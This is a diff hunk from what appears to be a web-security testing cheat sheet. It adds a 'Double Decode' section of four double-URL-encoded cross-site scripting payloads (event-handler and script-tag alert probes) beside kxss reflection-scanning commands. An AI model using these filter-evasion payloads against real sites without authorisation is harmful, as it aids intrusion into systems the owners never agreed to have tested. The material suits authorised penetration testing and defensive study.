@@ -545,6 +545,15 @@
 	cat domain.txt | kxss | grep "\" ' < >" | tee kxss.txt
 	
 	cat domain.txt | kxss
+
+
+	Double Decode :
+ 		%2527%2520onmouseover%253D%2527alert%25281%2529%2527%2520
+   		%2527%2520onfocus%253D%2527alert%25281%2529%2527%2520autofocus%253D%2527
+     		%2527%2520onfocus%253D%2527alert%25281%2529%2527%2520
+       		%2527%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
+   		
+    
 </details>
 
 -----------------------------------------------------------------------------
